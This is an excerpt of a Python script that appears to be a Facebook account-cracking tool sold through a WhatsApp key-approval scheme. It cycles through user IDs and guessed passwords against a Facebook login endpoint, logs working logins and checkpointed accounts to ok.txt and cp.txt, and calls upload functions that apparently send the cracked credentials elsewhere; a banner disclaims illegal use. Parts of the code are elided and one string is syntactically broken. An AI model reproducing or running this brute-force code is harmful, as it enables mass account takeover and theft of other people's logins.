...
def notice():
	...
	runtxt("\033[0;92m ADMIN WHATSAPP >> +8801839000896")
	subprocess.check_output(["am", "start", "https://wa.me/+8801839000896"])
    tks = 'Dear%20Admin,%20Please%20Approved%20My%20Token%20To%20Premium%20% 20% 20%20%20My%20%20Key%20%20:%20'G,R,G,B,G,key

        os.system('am start https://wa.me/+880183900896?text=' + tks)
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/minhaz60/minhaz-test/blob/main/Approved.txt').text
			if basesplit in plr:
				key = basesplit
...
\033[0;96m##     ## ##     ## ##     ## #### #### 
 ...
 > \033[0;92mDEVELOPER     : ABDULLAH MINHAZ
 > \033[0;95mFACEBOOK ID   : M A Al MINHAZ>
 > \033[0;41mWHATSAPP      : +8801839000896
 \033[0;96m> YOUTUBE       : MIH∆Z> WORLD
 > \033[0;97mWARNING       : DONT USE FOR ILLEGAL WORK     
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [MIH∆Z>] : %s/%s -> \033[0;92m [ MIH∆Z>-OK:%s ]- \033[0;93m[MIH∆Z>-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[MIH∆Z>-OK😍] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [MIH∆Z>-OK😍] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[MIH∆Z>-CP😭] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [MIH∆Z>-CP😭] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
